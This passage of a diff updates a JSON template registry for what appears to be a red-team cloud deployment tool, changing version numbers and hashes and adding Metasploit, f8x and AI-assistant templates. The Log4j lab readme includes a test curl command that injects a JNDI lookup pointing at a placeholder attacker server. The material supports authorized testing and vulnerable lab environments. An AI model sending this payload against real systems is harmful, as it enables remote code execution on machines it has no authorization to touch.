+          "sha256": "8357c329933196b26bc025932e820e026d91207d666548ccf725284309d46d31",
+          "updated_at": "2026-03-05T12:21:13.600513Z"
         }
       },
-      "latest": "1.0.5",
+      "latest": "1.0.6",
       "metadata": {
         "name": "file",
         "author": "r0fus0d",
@@ -425,13 +482,13 @@
       "provider": "tencent",
       "slug": "jndi",
       "versions": {
-        "1.0.5": {
-          "url": "https://redc.zeoday.org/templates/tencent_jndi_v1.0.5.zip",
-          "sha256": "162ced1aedb89c2d95973a069c5b4c8d9731362f1889ea34ca52a86e0d559fdc",
-          "updated_at": "2026-02-26T01:41:01.766772Z"
+        "1.0.6": {
+          "url": "https://redc.zeoday.org/templates/tencent_jndi_v1.0.6.zip",
+          "sha256": "1e55708d0df14504cfc0d653f968f255a65874bedd173515f39a37bd7daf3b0f",
+          "updated_at": "2026-03-05T12:21:13.601655Z"
         }
       },
-      "latest": "1.0.5",
+      "latest": "1.0.6",
       "metadata": {
         "name": "jndi",
         "author": "r0fus0d",
@@ -444,13 +501,13 @@
       "provider": "tencent",
       "slug": "nps",
       "versions": {
-        "1.0.8": {
-          "url": "https://redc.zeoday.org/templates/tencent_nps_v1.0.8.zip",
-          "sha256": "cc0833eea849e74b7807c0d5bece01d7bc736283371500fe6413949c0a10f866",
-          "updated_at": "2026-02-26T01:41:01.768074Z"
+        "1.0.9": {
+          "url": "https://redc.zeoday.org/templates/tencent_nps_v1.0.9.zip",
+          "sha256": "b4226360bef65e510571957a32ec7b3c5e86056e72a893f8cb4273bf737679c4",
+          "updated_at": "2026-03-05T12:21:13.603184Z"
         }
       },
-      "latest": "1.0.8",
+      "latest": "1.0.9",
       "metadata": {
         "name": "nps",
         "author": "r0fus0d",
@@ -463,13 +520,13 @@
       "provider": "ucloud",
       "slug": "uhost",
       "versions": {
-        "1.0.1": {
-          "url": "https://redc.zeoday.org/templates/ucloud_uhost_v1.0.1.zip",
-          "sha256": "c5329d227ce8afa48ee294f3a679688547900066b805d44b59d4add21cbd7c0d",
-          "updated_at": "2026-02-26T01:41:01.769022Z"
+        "1.0.2": {
+          "url": "https://redc.zeoday.org/templates/ucloud_uhost_v1.0.2.zip",
+          "sha256": "0a5fa1aa534cb46a3514833f33ddb2ad8cab05d55676324c8e15b99aec809c63",
+          "updated_at": "2026-03-05T12:21:13.604277Z"
         }
       },
-      "latest": "1.0.1",
+      "latest": "1.0.2",
       "metadata": {
         "name": "uhost",
         "author": "r0fus0d",
@@ -482,13 +539,13 @@
       "provider": "userdata-templates",
       "slug": "basic-setup-bash",
       "versions": {
-        "1.0.2": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_basic-setup-bash_v1.0.2.zip",
-          "sha256": "4dfede77ffa98ac9502a62f08b2d171ed039c83f30dbceb263b4ac47ece466d6",
-          "updated_at": "2026-02-26T01:41:01.769613Z"
+        "1.0.3": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_basic-setup-bash_v1.0.3.zip",
+          "sha256": "7d9e92985e2ddd2641b482dfb52506bdc35b1efe10e6cc18e70665850e3079bf",
+          "updated_at": "2026-03-05T12:21:13.604923Z"
         }
       },
-      "latest": "1.0.2",
+      "latest": "1.0.3",
       "metadata": {
         "name": "basic-setup-bash",
         "author": "r0fus0d",
@@ -501,13 +558,13 @@
       "provider": "userdata-templates",
       "slug": "basic-setup-powershell",
       "versions": {
-        "1.0.2": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_basic-setup-powershell_v1.0.2.zip",
-          "sha256": "9ad9b99afc08c7f22b6ee20ea607ab95c647b27442e7958be5ad9f8dc33416f8",
-          "updated_at": "2026-02-26T01:41:01.770112Z"
+        "1.0.3": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_basic-setup-powershell_v1.0.3.zip",
+          "sha256": "d9cab3cc0fcd58bb8383cb416bd936ac3605c997bbe7f2a4d2d65aee4c1cf5dd",
+          "updated_at": "2026-03-05T12:21:13.605515Z"
         }
       },
-      "latest": "1.0.2",
+      "latest": "1.0.3",
       "metadata": {
         "name": "basic-setup-powershell",
         "author": "r0fus0d",
@@ -515,18 +572,37 @@
         "readme": "# 基础设置\n\n这是一个用于基础系统设置，安装 Chocolatey 的 userdata 模板。\n\n## 功能说明\n\n1. 设置执行策略\n2. 安装 Chocolatey 包管理器\n"
       }
     },
+    "userdata-templates/copaw-bash": {
+      "id": "userdata-templates/copaw-bash",
+      "provider": "userdata-templates",
+      "slug": "copaw-bash",
+      "versions": {
+        "1.0.1": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_copaw-bash_v1.0.1.zip",
+          "sha256": "9b325b6ac55cab11645a3e824ff36e62cecf62113badaf5611fbcbbb67db6de7",
+          "updated_at": "2026-03-05T12:21:13.606219Z"
+        }
+      },
+      "latest": "1.0.1",
+      "metadata": {
+        "name": "copaw-bash",
+        "author": "MiniMax-M2.5",
+        "description": "开源 AI 个人助理，支持多端接入、能力扩展、定时任务",
+        "readme": "# CoPaw\n\n开源 AI 个人助理；安装极简、本地与云上均可部署；支持多端接入、能力轻松扩展。\n\n## 核心能力\n\n- **全域触达** — 钉钉、飞书、QQ、Discord、iMessage 等频道，一个 CoPaw 按需连接。\n- **由你掌控** — 记忆与个性化由你掌控，本地或云端均可；定时与协作发往指定频道。\n- **Skills 扩展** — 内置定时任务，自定义技能目录，CoPaw 自动加载，无绑定。\n\n## 使用场景\n\n### 社交媒体\n- 每日热帖摘要（小红书、知乎、Reddit）\n- B 站/YouTube 新视频摘要\n\n### 生产力\n- 邮件与 Newsletter 精华推送到钉钉/飞书/QQ\n- 邮件与日历整理联系人\n\n### 创意与构建\n- 睡前说明目标、自动执行，次日获得雏形\n- 从选题到成片全流程\n\n### 研究与学习\n- 追踪科技与 AI 资讯\n- 个人知识库检索复用\n\n### 桌面与文件\n- 整理与搜索本地文件\n- 阅读与摘要文档\n\n## 快速开始\n\n### 访问控制台\n\n部署完成后，访问 http://localhost:8088 进入控制台。\n\n### 配置 AI 模型\n\n首次使用需要配置 LLM 提供商：\n\n1. 打开 http://localhost:8088 → 设置 → 模型\n2. 选择提供商（如 DashScope、OpenAI 等）\n3. 填写 API Key 并启用\n\n### 本地模型支持\n\n如使用本地模型（无需 API Key）：\n\n```bash\n# 安装支持\npip install 'copaw[llamacpp]'\n\n# 下载模型\ncopaw models download Qwen/Qwen3-4B-GGUF\n\n# 启动并选择本地模型\ncopaw models\ncopaw app\n```\n\n### 接入频道\n\n支持多种通讯平台接入：\n\n- 钉钉\n- 飞书\n- QQ\n- Discord\n- iMessage\n\n详见官方文档。\n\n## 环境变量\n\n| 变量 | 说明 |\n|------|------|\n| `DASHSCOPE_API_KEY` | 阿里云 DashScope API Key |\n| `OPENAI_API_KEY` | OpenAI API Key |\n| `MODELSCOPE_API_KEY` | ModelScope API Key |\n\n## 更多信息\n\n- 官方文档：https://copaw.agentscope.io\n- GitHub：https://github.com/agentscope-ai/CoPaw\n"
+      }
+    },
     "userdata-templates/dify-bash": {
       "id": "userdata-templates/dify-bash",
       "provider": "userdata-templates",
       "slug": "dify-bash",
       "versions": {
-        "1.0.2": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_dify-bash_v1.0.2.zip",
-          "sha256": "0952bb577782426450d42170949c3457b701de42f354d6084dec8e910526b1fb",
-          "updated_at": "2026-02-26T01:41:01.770642Z"
+        "1.0.3": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_dify-bash_v1.0.3.zip",
+          "sha256": "f1cfc4c8d4db887afb17ad517a84145031b006da1a5bd86cc108fc0fe92eb913",
+          "updated_at": "2026-03-05T12:21:13.606806Z"
         }
       },
-      "latest": "1.0.2",
+      "latest": "1.0.3",
       "metadata": {
         "name": "dify-bash",
         "author": "r0fus0d",
@@ -539,13 +615,13 @@
       "provider": "userdata-templates",
       "slug": "docker-compose-bash",
       "versions": {
-        "1.0.2": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_docker-compose-bash_v1.0.2.zip",
-          "sha256": "4d2f32fec7ad50a46f1234747f13ac2ca6709af701f1f62ccb1f8b3c4cdd3556",
-          "updated_at": "2026-02-26T01:41:01.771127Z"
+        "1.0.3": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_docker-compose-bash_v1.0.3.zip",
+          "sha256": "f637677a9b67c1deb51911598ef78b22547bfa421341e0462eadae522f5c7835",
+          "updated_at": "2026-03-05T12:21:13.607395Z"
         }
       },
-      "latest": "1.0.2",
+      "latest": "1.0.3",
       "metadata": {
         "name": "docker-compose-bash",
         "author": "r0fus0d",
@@ -558,13 +634,13 @@
       "provider": "userdata-templates",
       "slug": "docker-desktop-powershell",
       "versions": {
-        "1.0.2": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_docker-desktop-powershell_v1.0.2.zip",
-          "sha256": "75ed03acb78825a097b152bad998cd9aa12e5c435f7b3075ad101e2555863c6d",
-          "updated_at": "2026-02-26T01:41:01.771615Z"
+        "1.0.3": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_docker-desktop-powershell_v1.0.3.zip",
+          "sha256": "1273564d96511d05d943fdb77127f2b568c612b6fb6deec6afb5b774ac8d8430",
+          "updated_at": "2026-03-05T12:21:13.607943Z"
         }
       },
-      "latest": "1.0.2",
+      "latest": "1.0.3",
       "metadata": {
         "name": "docker-desktop-powershell",
         "author": "r0fus0d",
@@ -577,13 +653,13 @@
       "provider": "userdata-templates",
       "slug": "docker-installation-bash",
       "versions": {
-        "1.0.2": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_docker-installation-bash_v1.0.2.zip",
-          "sha256": "413b4c8ec32b31650d1c956e31ffe631ba8a8f18cdd940502c1761cc9c84c069",
-          "updated_at": "2026-02-26T01:41:01.772088Z"
+        "1.0.3": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_docker-installation-bash_v1.0.3.zip",
+          "sha256": "679efaeb80f7a9b5189d0090dea151c15a152a7ac7dc83d4f7022865b284fee8",
+          "updated_at": "2026-03-05T12:21:13.608518Z"
         }
       },
-      "latest": "1.0.2",
+      "latest": "1.0.3",
       "metadata": {
         "name": "docker-installation-bash",
         "author": "r0fus0d",
@@ -591,18 +667,37 @@
         "readme": "# Docker 安装\n\n这是一个用于安装 Docker 引擎的 userdata 模板。\n\n## 功能说明\n\n1. 下载并执行 Docker 安装脚本\n2. 启动并启用 Docker 服务\n3. 将当前用户添加到 docker 组\n"
       }
     },
+    "userdata-templates/f8x-bash": {
+      "id": "userdata-templates/f8x-bash",
+      "provider": "userdata-templates",
+      "slug": "f8x-bash",
+      "versions": {
+        "1.0.0": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_f8x-bash_v1.0.0.zip",
+          "sha256": "759bf3400afeea4b5ad6e418ba2ecb4028ceb96ca449da74652abcd7fd68f318",
+          "updated_at": "2026-03-05T12:21:13.609088Z"
+        }
+      },
+      "latest": "1.0.0",
+      "metadata": {
+        "name": "f8x-bash",
+        "author": "r0fus0d",
+        "description": "f8x 渗透测试工具集，一键部署多种渗透测试工具",
+        "readme": "# 场景使用\n\n1. 使用前请按照注意事项进行配置\n2. 使用方法：在终端中运行以下命令\n\n```\n./f8x\n```\n\n查看帮助信息：\n\n```\n./f8x -h\n```\n\n# f8x 简介\n\nf8x 是一款渗透测试工具集，可以一键部署多种渗透测试工具，包括：\n\n- 扫描器\n- 漏洞利用工具\n- 后门生成工具\n- 提权工具\n- 等等\n\n# 注意事项\n\n- 本工具仅供 **授权的渗透测试** 使用\n- 首次运行会自动安装依赖\n"
+      }
+    },
     "userdata-templates/fastjson-rce": {
       "id": "userdata-templates/fastjson-rce",
       "provider": "userdata-templates",
       "slug": "fastjson-rce",
       "versions": {
-        "1.0.1": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_fastjson-rce_v1.0.1.zip",
-          "sha256": "ebc3e40d5162b3a8587b77989b4f0f0ab88e85bf7103959f0dd4af23408d59cb",
-          "updated_at": "2026-02-26T01:41:01.772656Z"
+        "1.0.2": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_fastjson-rce_v1.0.2.zip",
+          "sha256": "21c9a846403d2ddf79939481173c0c96692e698afca9867ccc99bfdd29edac30",
+          "updated_at": "2026-03-05T12:21:13.609765Z"
         }
       },
-      "latest": "1.0.1",
+      "latest": "1.0.2",
       "metadata": {
         "name": "fastjson-rce",
         "author": "redc",
@@ -615,13 +710,13 @@
       "provider": "userdata-templates",
       "slug": "git-installation-powershell",
       "versions": {
-        "1.0.2": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_git-installation-powershell_v1.0.2.zip",
-          "sha256": "7a76826b3e0f525dcf9bb73249e67637005741712810a65202e9b746d0f0b72f",
-          "updated_at": "2026-02-26T01:41:01.773140Z"
+        "1.0.3": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_git-installation-powershell_v1.0.3.zip",
+          "sha256": "0f52df50769c034a0e851e6a949913dca6ef5a911ffa46abb51b1e81a2b3207d",
+          "updated_at": "2026-03-05T12:21:13.610336Z"
         }
       },
-      "latest": "1.0.2",
+      "latest": "1.0.3",
       "metadata": {
         "name": "git-installation-powershell",
         "author": "r0fus0d",
@@ -634,13 +729,13 @@
       "provider": "userdata-templates",
       "slug": "iis-installation-powershell",
       "versions": {
-        "1.0.2": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_iis-installation-powershell_v1.0.2.zip",
-          "sha256": "ac49ca6fccf218a927ebc53cabc8319ba059cadaa9dfb1a012d4ff2e64e95924",
-          "updated_at": "2026-02-26T01:41:01.773691Z"
+        "1.0.3": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_iis-installation-powershell_v1.0.3.zip",
+          "sha256": "8e660324fc7d1e0f54de1fdb7fabb79e897e20b39f8ba4fd591b7254954ac341",
+          "updated_at": "2026-03-05T12:21:13.610882Z"
         }
       },
-      "latest": "1.0.2",
+      "latest": "1.0.3",
       "metadata": {
         "name": "iis-installation-powershell",
         "author": "r0fus0d",
@@ -653,13 +748,13 @@
       "provider": "userdata-templates",
       "slug": "log4j-rce",
       "versions": {
-        "1.0.1": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_log4j-rce_v1.0.1.zip",
-          "sha256": "1566325c027bfbcf6d7f5e195548defcbb3a7c1ca82fa0881b876b90887c276c",
-          "updated_at": "2026-02-26T01:41:01.774254Z"
+        "1.0.2": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_log4j-rce_v1.0.2.zip",
+          "sha256": "6b47324d23fad833bdd3b34f447a1c18edd973dfa3ca5cecfd8b9043ba3939f9",
+          "updated_at": "2026-03-05T12:21:13.611557Z"
         }
       },
-      "latest": "1.0.1",
+      "latest": "1.0.2",
       "metadata": {
         "name": "log4j-rce",
         "author": "redc",
@@ -667,18 +762,37 @@
         "readme": "# Log4j RCE (CVE-2021-44228)\n\n## 漏洞简介\n\nApache Log4j2 JNDI 远程代码执行漏洞，又称 Log4Shell，是近年来最严重的漏洞之一。攻击者可以利用 Log4j 的日志记录功能，通过构造特殊的日志消息来触发 JNDI 远程加载，从而执行任意代码。\n\n## CVE 信息\n\n- **CVE 编号**: CVE-2021-44228\n- **漏洞类型**: RCE (远程代码执行)\n- **危险等级**: Critical (严重)\n- **影响版本**: Log4j 2.0 ~ 2.14.1\n\n## 环境信息\n\n- **镜像**: vulhub/log4j:2.17.0\n- **端口**: 8989\n- **服务**: Log4j RCE 测试环境\n\n## 使用方法\n\n1. 在云服务器上执行 userdata 脚本\n2. 脚本会自动安装 Docker 并启动 Log4j 漏洞环境\n3. 访问 `http://<your-ip>:8989` 进行测试\n\n## 测试方法\n\n```bash\n# 使用 curl 发送恶意请求\ncurl -X GET \"http://<your-ip>:8989\" -H \"X-Api-Version: \\${jndi:ldap://<your-attacker-server>/Exploit}\"\n```\n\n## 注意事项\n\n- 此环境仅用于安全研究\n- 请在防火墙中限制访问来源\n- 测试完成后请及时删除环境\n\n## 参考链接\n\n- [Vulhub Log4j 漏洞环境](https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2021-44228)\n- [NVD CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)\n"
       }
     },
+    "userdata-templates/msf-bash": {
+      "id": "userdata-templates/msf-bash",
+      "provider": "userdata-templates",
+      "slug": "msf-bash",
+      "versions": {
+        "1.0.0": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_msf-bash_v1.0.0.zip",
+          "sha256": "7efa5745badd05d289270dd82a22691dddf65cc11ffc7efccf361723706f8564",
+          "updated_at": "2026-03-05T12:21:13.612165Z"
+        }
+      },
+      "latest": "1.0.0",
+      "metadata": {
+        "name": "msf-bash",
+        "author": "r0fus0d",
+        "description": "Metasploit 渗透测试框架，安装全球最流行的渗透测试工具",
+        "readme": "# 场景使用\n\n1. 使用前请按照注意事项进行配置\n2. 使用方法：安装完成后运行以下命令\n\n启动 msfconsole：\n```\nmsfconsole\n```\n\n更新 Metasploit：\n```\nmsfupdate\n```\n\n# MSF 简介\n\nMetasploit (MSF) 是全球最流行的渗透测试框架，包含：\n\n- 漏洞利用模块 (Exploits)\n- 辅助模块 (Auxiliary)\n- 后渗透模块 (Post)\n- 载荷生成器 (Payloads)\n- 编码器 (Encoders)\n- 等等\n\n# 注意事项\n\n- 本工具仅供 **授权的渗透测试** 使用\n- 首次运行会初始化数据库\n- 可使用 `msfdb init` 初始化数据库\n"
+      }
+    },
     "userdata-templates/mysql-client-bash": {
       "id": "userdata-templates/mysql-client-bash",
       "provider": "userdata-templates",
       "slug": "mysql-client-bash",
       "versions": {
-        "1.0.2": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_mysql-client-bash_v1.0.2.zip",
-          "sha256": "4d9bd35e1503aca5e2b217494769a30131dffc13b05bf716f987f9c6d2289cda",
-          "updated_at": "2026-02-26T01:41:01.774751Z"
+        "1.0.3": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_mysql-client-bash_v1.0.3.zip",
+          "sha256": "c48a9f79ba9c092d943bcfce841e12ab3575380926c6d5f87722814fd77b765d",
+          "updated_at": "2026-03-05T12:21:13.612718Z"
         }
       },
-      "latest": "1.0.2",
+      "latest": "1.0.3",
       "metadata": {
         "name": "mysql-client-bash",
         "author": "r0fus0d",
@@ -691,13 +805,13 @@
       "provider": "userdata-templates",
       "slug": "n8n-bash",
       "versions": {
-        "1.0.2": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_n8n-bash_v1.0.2.zip",
-          "sha256": "522e0917d7d85952ba65aa3e431ce4c8d7121c54f6fdb70acd9833ae65a848b9",
-          "updated_at": "2026-02-26T01:41:01.775231Z"
+        "1.0.3": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_n8n-bash_v1.0.3.zip",
+          "sha256": "a2ac19b9f9c31545266024e9eb4ff7e833d82982dc6d00d5863d8eb25660fc8c",
+          "updated_at": "2026-03-05T12:21:13.613296Z"
         }
       },
-      "latest": "1.0.2",
+      "latest": "1.0.3",
       "metadata": {
         "name": "n8n-bash",
         "author": "r0fus0d",
@@ -710,13 +824,13 @@
       "provider": "userdata-templates",
       "slug": "nginx-installation-bash",
       "versions": {
-        "1.0.2": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_nginx-installation-bash_v1.0.2.zip",
-          "sha256": "13762a340c89c89c510b7b42858cdb331a85eb9ae5ad793646e89db473459e9d",
-          "updated_at": "2026-02-26T01:41:01.775720Z"
+        "1.0.3": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_nginx-installation-bash_v1.0.3.zip",
+          "sha256": "41fe828cfe23109b825555f40e57d3d063da1848f4d6083e8a1fa1f69a0efc1a",
+          "updated_at": "2026-03-05T12:21:13.614086Z"
         }
       },
-      "latest": "1.0.2",
+      "latest": "1.0.3",
       "metadata": {
         "name": "nginx-installation-bash",
         "author": "r0fus0d",
@@ -729,13 +843,13 @@
       "provider": "userdata-templates",
       "slug": "nodejs-installation-bash",
       "versions": {
-        "1.0.2": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_nodejs-installation-bash_v1.0.2.zip",
-          "sha256": "abcb5d1f40f859dec2f2204542b766853df672a0170c3e4421eacc0101c1dfbb",
-          "updated_at": "2026-02-26T01:41:01.776199Z"
+        "1.0.3": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_nodejs-installation-bash_v1.0.3.zip",
+          "sha256": "bada2587e431b209871ad2669231138919f1645177c64479789a9603a4fdcc43",
+          "updated_at": "2026-03-05T12:21:13.614704Z"
         }
       },
-      "latest": "1.0.2",
+      "latest": "1.0.3",
       "metadata": {
         "name": "nodejs-installation-bash",
         "author": "r0fus0d",
@@ -748,13 +862,13 @@
       "provider": "userdata-templates",
       "slug": "openclaw-bash",
       "versions": {
-        "1.0.3": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_openclaw-bash_v1.0.3.zip",
-          "sha256": "c348b409ac9362c509f37734426a00abefda92c67d7a880f826d47e36791f578",
-          "updated_at": "2026-02-26T01:41:01.776695Z"
+        "1.0.4": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_openclaw-bash_v1.0.4.zip",
+          "sha256": "9a88d438309a2eedcf6a393b45f95356474bd95c68ece242641c55587d3ca0e1",
+          "updated_at": "2026-03-05T12:21:13.615465Z"
         }
       },
-      "latest": "1.0.3",
+      "latest": "1.0.4",
       "metadata": {
         "name": "openclaw-bash",
         "author": "r0fus0d",
@@ -767,13 +881,13 @@
       "provider": "userdata-templates",
       "slug": "postgresql-client-bash",
       "versions": {
-        "1.0.2": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_postgresql-client-bash_v1.0.2.zip",
-          "sha256": "e73a839c238ae2bca4e5dad1286afe788d1cdee2ebdde3d447257b0546166985",
-          "updated_at": "2026-02-26T01:41:01.777165Z"
+        "1.0.3": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_postgresql-client-bash_v1.0.3.zip",
+          "sha256": "6e2413a93855c9a51581bdc8837517fce1b8f25d1c27cfc6bf240d3ecd6c0483",
+          "updated_at": "2026-03-05T12:21:13.616178Z"
         }
       },
-      "latest": "1.0.2",
+      "latest": "1.0.3",
       "metadata": {
         "name": "postgresql-client-bash",
         "author": "r0fus0d",
@@ -786,13 +900,13 @@
       "provider": "userdata-templates",
       "slug": "python-installation-bash",
       "versions": {
-        "1.0.2": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_python-installation-bash_v1.0.2.zip",
-          "sha256": "516e555928578f208e9fa84f25d1e9913d5a84af815b920ef2763ff892716bac",
-          "updated_at": "2026-02-26T01:41:01.777654Z"
+        "1.0.3": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_python-installation-bash_v1.0.3.zip",
+          "sha256": "8c062eef23a23f6a6eed7bb1610b9efac0eec935bb7df04ac1b4c392eefc2590",
+          "updated_at": "2026-03-05T12:21:13.616861Z"
         }
       },
-      "latest": "1.0.2",
+      "latest": "1.0.3",
       "metadata": {
         "name": "python-installation-bash",
         "author": "r0fus0d",
@@ -805,13 +919,13 @@
       "provider": "userdata-templates",
       "slug": "shiro-rce",
       "versions": {
-        "1.0.1": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_shiro-rce_v1.0.1.zip",
-          "sha256": "77bd7d79d7c3269178ce3bde009c4d47c616d1d02ef6c5373fe1b846860c9c1b",
-          "updated_at": "2026-02-26T01:41:01.778214Z"
+        "1.0.2": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_shiro-rce_v1.0.2.zip",
+          "sha256": "295c5b2dfe70c07d2e50a9c8f775287fe5f144c9ef34c113d107a6596490c9f2",
+          "updated_at": "2026-03-05T12:21:13.617682Z"
         }
       },
-      "latest": "1.0.1",
+      "latest": "1.0.2",
       "metadata": {
         "name": "shiro-rce",
         "author": "redc",
@@ -824,13 +938,13 @@
       "provider": "userdata-templates",
       "slug": "spring-core-rce",
       "versions": {
-        "1.0.1": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_spring-core-rce_v1.0.1.zip",
-          "sha256": "164cacae39daf1ebf3c62962a4d632aaa68b6e7bb05db86f809870c712b29f36",
-          "updated_at": "2026-02-26T01:41:01.778793Z"
+        "1.0.2": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_spring-core-rce_v1.0.2.zip",
+          "sha256": "9f5d109e33875e6c57857f52e89d1ce8e4f95e7a5a4789cbdede2120afa68d39",
+          "updated_at": "2026-03-05T12:21:13.618549Z"
         }
       },
-      "latest": "1.0.1",
+      "latest": "1.0.2",
       "metadata": {
         "name": "spring-core-rce",
         "author": "redc",
@@ -843,13 +957,13 @@
       "provider": "userdata-templates",
       "slug": "vscode-installation-powershell",
       "versions": {
-        "1.0.2": {
-          "url": "https://redc.zeoday.org/templates/userdata-templates_vscode-installation-powershell_v1.0.2.zip",
-          "sha256": "bd77a0e8767b000d1d691912f86fca08d266e28251e1b83bd6d598608965639f",
-          "updated_at": "2026-02-26T01:41:01.779262Z"
+        "1.0.3": {
+          "url": "https://redc.zeoday.org/templates/userdata-templates_vscode-installation-powershell_v1.0.3.zip",
+          "sha256": "297a2aa8e3125ef875fcbfad496d007c8c614c8cea1356da9fab7ad1aa43c507",
+          "updated_at": "2026-03-05T12:21:13.619261Z"
         }
       },
-      "latest": "1.0.2",
+      "latest": "1.0.3",
       "metadata": {
         "name": "vscode-installation-powershell",
         "author": "r0fus0d",
@@ -862,13 +976,13 @@
       "provider": "volcengine",
       "slug": "ecs",
       "versions": {
-        "1.0.5": {
-          "url": "https://redc.zeoday.org/templates/volcengine_ecs_v1.0.5.zip",
-          "sha256": "e14865a2b5b73f8cfec5f3c7d5dc45b71085862f2ebf70a66dd0c07fcbbae8d9",
-          "updated_at": "2026-02-26T01:41:01.780209Z"
+        "1.0.6": {
+          "url": "https://redc.zeoday.org/templates/volcengine_ecs_v1.0.6.zip",
+          "sha256": "e8947cfeff2c8b93f5ce57e5b240041563270f386ab47485375cd4f88443630c",
+          "updated_at": "2026-03-05T12:21:13.620569Z"
         }
       },
-      "latest": "1.0.5",
+      "latest": "1.0.6",
       "metadata": {
         "name": "ecs",
         "author": "copilot",
@@ -881,13 +995,13 @@
       "provider": "vultr",
       "slug": "hk-vps",
       "versions": {
-        "1.0.2": {
-          "url": "https://redc.zeoday.org/templates/vultr_hk-vps_v1.0.2.zip",
-          "sha256": "bd56ab151dcd990a602f915d9e8bbda369559ec1308a0e96bef2c551718448fe",
-          "updated_at": "2026-02-26T01:41:01.781119Z"
+        "1.0.3": {
+          "url": "https://redc.zeoday.org/templates/vultr_hk-vps_v1.0.3.zip",
+          "sha256": "3fbe40b73d631ace3453925643fe71312a53935bfb1bb7193805b6b84485e0f0",
+          "updated_at": "2026-03-05T12:21:13.621854Z"
         }
       },
-      "latest": "1.0.2",
+      "latest": "1.0.3",
       "metadata": {
         "name": "hk-vps",
         "author": "r0fus0d",
